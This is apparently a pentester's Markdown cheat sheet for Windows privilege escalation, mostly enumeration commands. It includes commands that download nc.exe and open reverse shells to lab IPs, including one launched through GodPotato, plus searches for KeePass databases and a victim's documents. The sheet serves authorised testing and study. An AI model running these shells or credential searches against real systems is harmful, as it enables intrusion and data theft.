# Windows Privilege Escalation

## Enumeration

### Information we must know

```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

### Commands

```powershell
# Get a stable shell
# Check if we can first make/use global temp
mkdir C:\Temp
cd C:\Temp
# If not, we might have to work in local temp (this can break calling tools as other users within RunasCs.exe)
cd %temp%
cd $env:temp
mkdir Tools
cd Tools

curl 10.10.14.82/nc.exe -o nc.exe
# rlwrap -crA nc -lvnp 9002
.\nc.exe 10.10.14.82 9002 -e cmd.exe
powershell -ep bypass

# Check system information
systeminfo

# Check privileges
whoami /all

# Check if Windows Defender is turned on
Get-MpPreference

# Check local users
net user
Get-LocalUser

# Check local user information
net user offsec

# Check local groups (PS)
net localgroup
Get-LocalGroup

# Check local group members (PS)
Get-LocalGroupMember Administrators

# Check connections
netstat -ano

# Check inbound/outbound firewall rules
netsh advfirewall firewall show rule name=all dir=in
netsh advfirewall firewall show rule name=all dir=out

# Check installed applications (PS)
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Check running processes (PS)
Get-Process

# Check interface(s), IP address(es), DNS information
ipconfig /all

# Check routing table
route print

# Check ARP table
arp -a

# Check environment variables (CMD)
set

# Check environment variables (PS)
Get-ChildItem env:

# Check path (PS)
$env:path

# Check powershell history (PS)
Get-History

# Check PSReadline history (PS)
(Get-PSReadlineOption).HistorySavePath

# List permissions
icacls filename
icacls *
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
Get-Acl Microsoft | Select-Object -ExpandProperty Owner

# Search for sensitive files (.kdbx in this case is for KeePass database files) (PS)
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\Victim\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue

# Check services (PS)
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

# Check unquoted service paths (cmd)
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

# Interact with services (PS)
Start-Service TestService
Stop-Service TestService
Restart-Service TestService

# Check scheduled tasks
schtasks /query /fo LIST /v

# Query registry key
reg query "HKLM\SOFTWARE\MedDigi" /s
reg query "HKLM\SOFTWARE\MedDigi" /v EncKey
```

`icacls` permissions mask table (ACE = access control entry)

- `F` - Full access
- `M` - Modify access
- `RX` - Read and execute access
- `R` - Read-only access
- `W` - Write-only access

Inheritance rights ([MSDN](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls))

- `I` - Inherit. ACE inherited from the parent container
- `OI` - Object inherit. Objects in this container will inherit this ACE. Applies only to directories.
- `CI` - Container inherit. Containers in this parent container will inherit this ACE. Applies only to directories.
- `IO` - Inherit only. ACE inherited from the parent container, but does not apply to the object itself. Applies only to directories.
- `NP` - Do not propagate inherit. ACE inherited by containers and objects from the parent container, but does not propagate to nested containers. Applies only to directories.

[winPEAS](https://github.com/carlospolop/PEASS-ng/releases/)

## Exploitation

See: [PowerUp](PowerUp.md)

Abusing permissions: https://github.com/daem0nc0re/PrivFu/tree/main

### Vectors

#### OS is Windows 2012 - 2022 or Windows 8 - 11 with `SeImpersonatePrivilege` enabled

[GodPotato](https://github.com/BeichenDream/GodPotato)

Check `.NET` version

```powershell
# cmd
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s

# powershell
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version,Release -ErrorAction 0 | Where { $_.PSChildName -match '^(?!S)\p{L}'} | Select PSChildName, Version, Release
```

```powershell
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.204 9002"
```

#### Role is `nt authority\local service` without `SeImpersonatePrivilege` present

Commonly the role for a web server running on a windows computer (such as `xampp`)

[FullPowers](https://github.com/itm4n/FullPowers)

```powershell
.\FullPowers.exe
```
